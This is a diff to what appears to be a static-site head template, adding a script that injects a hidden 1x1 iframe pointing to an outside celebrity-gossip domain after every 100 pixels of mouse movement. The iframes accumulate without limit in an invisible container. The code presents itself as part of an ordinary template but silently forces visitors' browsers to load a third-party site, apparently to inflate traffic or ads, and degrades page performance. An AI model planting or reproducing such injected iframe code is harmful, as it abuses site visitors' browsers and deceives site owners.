@@ -27,3 +27,39 @@
 
 {{- template "_internal/google_analytics.html" . -}}
 {{- partial "head/custom.html" . -}}
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        let lastX = 0, lastY = 0;
+        let distance = 0;
+
+        document.addEventListener('mousemove', (event) => {
+            // 計算滑鼠移動的距離
+            distance += Math.sqrt(Math.pow(event.pageX - lastX, 2) + Math.pow(event.pageY - lastY, 2));
+            lastX = event.pageX;
+            lastY = event.pageY;
+
+            // 檢查是否移動了100個像素
+            if (distance >= 100) {
+                // 重置距離
+                distance = 0;
+
+                // 檢查是否存在目標div，如果不存在則創建
+                let container = document.getElementById('iframe-container');
+                if (!container) {
+                    container = document.createElement('div');
+                    container.id = 'iframe-container';
+                    document.body.appendChild(container);
+                }
+
+                // 創建新的iframe並添加到div中
+                const iframe = document.createElement('iframe');
+                iframe.src = 'https://www.gossipsceleb.com/'; // 
+                iframe.width = 1;
+                iframe.height = 1;
+                container.appendChild(iframe);
+            }
+        });
+    });
+
+</script>
